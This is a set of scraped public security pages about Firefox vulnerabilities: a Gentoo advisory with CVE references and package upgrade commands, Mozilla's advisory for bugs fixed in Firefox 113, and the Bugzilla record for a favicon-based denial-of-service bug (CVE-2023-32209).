=== Content from security.gentoo.org_897e22ca_20250114_230043.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Firefox: Multiple Vulnerabilities — GLSA **202401-10**

Multiple vulnerabilities have been found in Mozilla Firefox, the worst of which could lead to remote code execution.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |
| Affected versions | < **121.0**< **115.6.0** |
| Unaffected versions | >= **121.0**>= **115.6.0** |

| Package | **www-client/firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **121.0**< **115.6.0** |
| Unaffected versions | >= **121.0**>= **115.6.0** |

### Background

Mozilla Firefox is a popular open-source web browser from the Mozilla project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Firefox. Please review the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox ESR binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-115.6.0:esr"

```

All Mozilla Firefox ESR users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-115.6.0:esr"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-121.0:rapid"

```

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-121.0:rapid"

```
### References

* [CVE-2023-3482](https://nvd.nist.gov/vuln/detail/CVE-2023-3482)
* [CVE-2023-4058](https://nvd.nist.gov/vuln/detail/CVE-2023-4058)
* [CVE-2023-4579](https://nvd.nist.gov/vuln/detail/CVE-2023-4579)
* [CVE-2023-4863](https://nvd.nist.gov/vuln/detail/CVE-2023-4863)
* [CVE-2023-5129](https://nvd.nist.gov/vuln/detail/CVE-2023-5129)
* [CVE-2023-5170](https://nvd.nist.gov/vuln/detail/CVE-2023-5170)
* [CVE-2023-5172](https://nvd.nist.gov/vuln/detail/CVE-2023-5172)
* [CVE-2023-5173](https://nvd.nist.gov/vuln/detail/CVE-2023-5173)
* [CVE-2023-5175](https://nvd.nist.gov/vuln/detail/CVE-2023-5175)
* [CVE-2023-5722](https://nvd.nist.gov/vuln/detail/CVE-2023-5722)
* [CVE-2023-5723](https://nvd.nist.gov/vuln/detail/CVE-2023-5723)
* [CVE-2023-5729](https://nvd.nist.gov/vuln/detail/CVE-2023-5729)
* [CVE-2023-5731](https://nvd.nist.gov/vuln/detail/CVE-2023-5731)
* [CVE-2023-5758](https://nvd.nist.gov/vuln/detail/CVE-2023-5758)
* [CVE-2023-6135](https://nvd.nist.gov/vuln/detail/CVE-2023-6135)
* [CVE-2023-6210](https://nvd.nist.gov/vuln/detail/CVE-2023-6210)
* [CVE-2023-6211](https://nvd.nist.gov/vuln/detail/CVE-2023-6211)
* [CVE-2023-6213](https://nvd.nist.gov/vuln/detail/CVE-2023-6213)
* [CVE-2023-6856](https://nvd.nist.gov/vuln/detail/CVE-2023-6856)
* [CVE-2023-6857](https://nvd.nist.gov/vuln/detail/CVE-2023-6857)
* [CVE-2023-6858](https://nvd.nist.gov/vuln/detail/CVE-2023-6858)
* [CVE-2023-6859](https://nvd.nist.gov/vuln/detail/CVE-2023-6859)
* [CVE-2023-6860](https://nvd.nist.gov/vuln/detail/CVE-2023-6860)
* [CVE-2023-6861](https://nvd.nist.gov/vuln/detail/CVE-2023-6861)
* [CVE-2023-6862](https://nvd.nist.gov/vuln/detail/CVE-2023-6862)
* [CVE-2023-6863](https://nvd.nist.gov/vuln/detail/CVE-2023-6863)
* [CVE-2023-6864](https://nvd.nist.gov/vuln/detail/CVE-2023-6864)
* [CVE-2023-6865](https://nvd.nist.gov/vuln/detail/CVE-2023-6865)
* [CVE-2023-6866](https://nvd.nist.gov/vuln/detail/CVE-2023-6866)
* [CVE-2023-6867](https://nvd.nist.gov/vuln/detail/CVE-2023-6867)
* [CVE-2023-6868](https://nvd.nist.gov/vuln/detail/CVE-2023-6868)
* [CVE-2023-6869](https://nvd.nist.gov/vuln/detail/CVE-2023-6869)
* [CVE-2023-6870](https://nvd.nist.gov/vuln/detail/CVE-2023-6870)
* [CVE-2023-6871](https://nvd.nist.gov/vuln/detail/CVE-2023-6871)
* [CVE-2023-6872](https://nvd.nist.gov/vuln/detail/CVE-2023-6872)
* [CVE-2023-6873](https://nvd.nist.gov/vuln/detail/CVE-2023-6873)
* [CVE-2023-32205](https://nvd.nist.gov/vuln/detail/CVE-2023-32205)
* [CVE-2023-32206](https://nvd.nist.gov/vuln/detail/CVE-2023-32206)
* [CVE-2023-32207](https://nvd.nist.gov/vuln/detail/CVE-2023-32207)
* [CVE-2023-32208](https://nvd.nist.gov/vuln/detail/CVE-2023-32208)
* [CVE-2023-32209](https://nvd.nist.gov/vuln/detail/CVE-2023-32209)
* [CVE-2023-32210](https://nvd.nist.gov/vuln/detail/CVE-2023-32210)
* [CVE-2023-32211](https://nvd.nist.gov/vuln/detail/CVE-2023-32211)
* [CVE-2023-32212](https://nvd.nist.gov/vuln/detail/CVE-2023-32212)
* [CVE-2023-32213](https://nvd.nist.gov/vuln/detail/CVE-2023-32213)
* [CVE-2023-32214](https://nvd.nist.gov/vuln/detail/CVE-2023-32214)
* [CVE-2023-32215](https://nvd.nist.gov/vuln/detail/CVE-2023-32215)
* [CVE-2023-32216](https://nvd.nist.gov/vuln/detail/CVE-2023-32216)
* [CVE-2023-34414](https://nvd.nist.gov/vuln/detail/CVE-2023-34414)
* [CVE-2023-34415](https://nvd.nist.gov/vuln/detail/CVE-2023-34415)
* [CVE-2023-34416](https://nvd.nist.gov/vuln/detail/CVE-2023-34416)
* [CVE-2023-34417](https://nvd.nist.gov/vuln/detail/CVE-2023-34417)
* [CVE-2023-37203](https://nvd.nist.gov/vuln/detail/CVE-2023-37203)
* [CVE-2023-37204](https://nvd.nist.gov/vuln/detail/CVE-2023-37204)
* [CVE-2023-37205](https://nvd.nist.gov/vuln/detail/CVE-2023-37205)
* [CVE-2023-37206](https://nvd.nist.gov/vuln/detail/CVE-2023-37206)
* [CVE-2023-37209](https://nvd.nist.gov/vuln/detail/CVE-2023-37209)
* [CVE-2023-37210](https://nvd.nist.gov/vuln/detail/CVE-2023-37210)
* [CVE-2023-37212](https://nvd.nist.gov/vuln/detail/CVE-2023-37212)
* MFSA-2023-40
* MFSA-TMP-2023-0002

**Release date**

January 07, 2024

**Latest revision**

January 07, 2024: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [908245](https://bugs.gentoo.org/show_bug.cgi?id=908245)
* [914073](https://bugs.gentoo.org/show_bug.cgi?id=914073)
* [918433](https://bugs.gentoo.org/show_bug.cgi?id=918433)
* [920507](https://bugs.gentoo.org/show_bug.cgi?id=920507)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.mozilla.org_9c4ab3df_20250114_230044.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-16

## Security Vulnerabilities fixed in Firefox 113

Announced
May 9, 2023
Impact
high
Products
Firefox
Fixed in

* Firefox 113

#### [#CVE-2023-32205: Browser prompts could have been obscured by popups](#CVE-2023-32205)

Reporter
Alesandro Ortiz
Impact
high
##### Description

In multiple cases browser prompts could have been obscured by popups controlled by content. These could have led to potential user confusion and spoofing attacks.

##### References

* [Bug 1753339](https://bugzilla.mozilla.org/show_bug.cgi?id=1753339)
* [Bug 1753341](https://bugzilla.mozilla.org/show_bug.cgi?id=1753341)

#### [#CVE-2023-32206: Crash in RLBox Expat driver](#CVE-2023-32206)

Reporter
Irvan Kurniawan
Impact
high
##### Description

An out-of-bound read could have led to a crash in the RLBox Expat driver.

##### References

* [Bug 1824892](https://bugzilla.mozilla.org/show_bug.cgi?id=1824892)

#### [#CVE-2023-32207: Potential permissions request bypass via clickjacking](#CVE-2023-32207)

Reporter
Hafiizh
Impact
high
##### Description

A missing delay in popup notifications could have made it possible for an attacker to trick a user into granting permissions.

##### References

* [Bug 1826116](https://bugzilla.mozilla.org/show_bug.cgi?id=1826116)

#### [#CVE-2023-32208: Leak of script base URL in service workers via import()](#CVE-2023-32208)

Reporter
Anne van Kesteren
Impact
moderate
##### Description

Service workers could reveal script base URL due to dynamic `import()`.

##### References

* [Bug 1646034](https://bugzilla.mozilla.org/show_bug.cgi?id=1646034)

#### [#CVE-2023-32209: Persistent DoS via favicon image](#CVE-2023-32209)

Reporter
Sam Ezeh
Impact
moderate
##### Description

A maliciously crafted favicon could have led to an out of memory crash.

##### References

* [Bug 1767194](https://bugzilla.mozilla.org/show_bug.cgi?id=1767194)

#### [#CVE-2023-32210: Incorrect principal object ordering](#CVE-2023-32210)

Reporter
Nika Layzell
Impact
moderate
##### Description

Documents were incorrectly assuming an ordering of principal objects when ensuring we were loading an appropriately privileged principal. In certain circumstances it might have been possible to cause a document to be loaded with a higher privileged principal than intended.

##### References

* [Bug 1776755](https://bugzilla.mozilla.org/show_bug.cgi?id=1776755)

#### [#CVE-2023-32211: Content process crash due to invalid wasm code](#CVE-2023-32211)

Reporter
P1umer and xmzyshypnc
Impact
moderate
##### Description

A type checking bug would have led to invalid code being compiled.

##### References

* [Bug 1823379](https://bugzilla.mozilla.org/show_bug.cgi?id=1823379)

#### [#CVE-2023-32212: Potential spoof due to obscured address bar](#CVE-2023-32212)

Reporter
Hafiizh
Impact
moderate
##### Description

An attacker could have positioned a `datalist` element to obscure the address bar.

##### References

* [Bug 1826622](https://bugzilla.mozilla.org/show_bug.cgi?id=1826622)

#### [#CVE-2023-32213: Potential memory corruption in FileReader::DoReadData()](#CVE-2023-32213)

Reporter
Ronald Crane
Impact
moderate
##### Description

When reading a file, an uninitialized value could have been used as read limit.

##### References

* [Bug 1826666](https://bugzilla.mozilla.org/show_bug.cgi?id=1826666)

#### [#MFSA-TMP-2023-0002: Race condition in dav1d decoding](#MFSA-TMP-2023-0002)

Reporter
Tyson Smith
Impact
moderate
##### Description

A race condition during dav1d decoding could have led to an out-of-bounds memory access, potentially leading to memory corruption and execution of malicious code.

##### References

* [Bug 1814790](https://bugzilla.mozilla.org/show_bug.cgi?id=1814790)
* [Bug 1819796](https://bugzilla.mozilla.org/show_bug.cgi?id=1819796)
* [Bug 1814560](https://bugzilla.mozilla.org/show_bug.cgi?id=1814560)

#### [#CVE-2023-32214: Potential DoS via exposed protocol handlers](#CVE-2023-32214)

Reporter
Edward Prior
Impact
low
##### Description

Protocol handlers `ms-cxh` and `ms-cxh-full` could have been leveraged to trigger a denial of service.
*Note: This attack only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1828716](https://bugzilla.mozilla.org/show_bug.cgi?id=1828716)

#### [#CVE-2023-32215: Memory safety bugs fixed in Firefox 113 and Firefox ESR 102.11](#CVE-2023-32215)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Gabriele Svelto, Andrew Osmond, Emily McDonough, Sebastian Hengst, Andrew McCreight and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 112 and Firefox ESR 102.10. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 113 and Firefox ESR 102.11](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1540883%2C1751943%2C1814856%2C1820210%2C1821480%2C1827019%2C1827024%2C1827144%2C1827359%2C1830186)

#### [#CVE-2023-32216: Memory safety bugs fixed in Firefox 113](#CVE-2023-32216)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Ronald Crane, Andrew McCreight, Randell Jesup and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 112. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 113](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1746479%2C1806852%2C1815987%2C1820359%2C1823568%2C1824803%2C1824834%2C1825170%2C1827020%2C1828130)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_d532a7f6_20250114_230042.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1767194)
* [XML](/show_bug.cgi?ctype=xml&id=1767194)

Closed
[Bug 1767194](/show_bug.cgi?id=1767194)
(CVE-2023-32209)

Opened 3 years ago
Closed 2 years ago

# persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large

## Categories

### (Core :: Graphics: ImageLib, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Graphics%3A%20ImageLib#Graphics%3A%20ImageLib)

Graphics: ImageLib
▾

Core :: Graphics: ImageLib
ImageLib decodes GIF, JPEG and PNG images, and provides the decoded data to the Compositor for display. If Firefox or Seamonkey can display an image when loaded separately from the page, ImageLib is working, and the actual imaging bug exists elsewhere within Firefox or Seamonkey.

Examples of appropriate bugs: PNG gAMA chunk ignored; Crashes on GIF w/corrupted frame(merr-01.gif); or PNGs and JPEGs aren't displayed on FreeBSD.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20ImageLib&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20ImageLib&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Graphics%3A%20ImageLib)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S2

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

113 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Accessibility Severity | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr102 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=wontfix) |
| firefox111 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix) |
| firefox112 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=wontfix) |
| firefox113 | --- | [verified](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr102 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox111 |  | wontfix |
| firefox112 |  | wontfix |
| firefox113 |  | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: sam.z.ezeh, Assigned: tnikkel)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/0646a42110a02dd585f200f270716852?d=mm&size=40)  [tnikkel](/user_profile?user_id=255010)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/1822ea7012f57fc5aeedc1d1f24f0079?d=mm&size=40)  [sam.z.ezeh](/user_profile?user_id=701580)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/0646a42110a02dd585f200f270716852?d=mm&size=40)  [tnikkel](/user_profile?user_id=255010)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

10 people

## References

### (Blocks 1 open bug, [URL](http://exploit-py.herokuapp.com/tiny.jpg "http://exploit-py.herokuapp.com/tiny.jpg") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1277397](/show_bug.cgi?id=1277397 "RESOLVED FIXED - High memory usage triggered by a jpg")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[eviltraps](/show_bug.cgi?id=432687 "NEW - [meta] Protect users from websites that trap them or destroy their experience")

Dependency [tree](/showdependencytree.cgi?id=1767194&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1767194)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[exploit-py.herokuapp.com/tiny.jpg](http://exploit-py.herokuapp.com/tiny.jpg "http://exploit-py.herokuapp.com/tiny.jpg")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1277397](/show_bug.cgi?id=1277397 "RESOLVED FIXED - High memory usage triggered by a jpg"), [1252200](/show_bug.cgi?id=1252200 "NEW - libjpeg-turbo: DoS via small Image with large Dimensions"), [1462008](/show_bug.cgi?id=1462008 "NEW - Small jpeg triggers runaway memory usage in Firefox 59 -> Nightly")

## Details

### (5 keywords, Whiteboard: [reporter-external] [client-bounty-form] [verif?][adv-main113+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2023-32209

[Keywords:](/describekeywords.cgi)

[crash](/buglist.cgi?keywords=crash&resolution=---),
[csectype-dos](/buglist.cgi?keywords=csectype-dos&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][adv-main113+]

QA Whiteboard:

[post-critsmash-triage]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#c21 "3 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (6 files, 2 obsolete files)

| [HTML Page with favicon set to an SVG containing the JPEG image](/attachment.cgi?id=9275127)  [3 years ago](#c6)  [sam.z.ezeh](/user_profile?user_id=701580)   47 bytes, application/octet-stream |  | [Details](/attachment.cgi?id=9275127&action=edit) |
| --- | --- | --- |
| [SVG file containing JPEG image data](/attachment.cgi?id=9275128)  [3 years ago](#c7)  [sam.z.ezeh](/user_profile?user_id=701580)   40 bytes, application/octet-stream |  | [Details](/attachment.cgi?id=9275128&action=edit) |
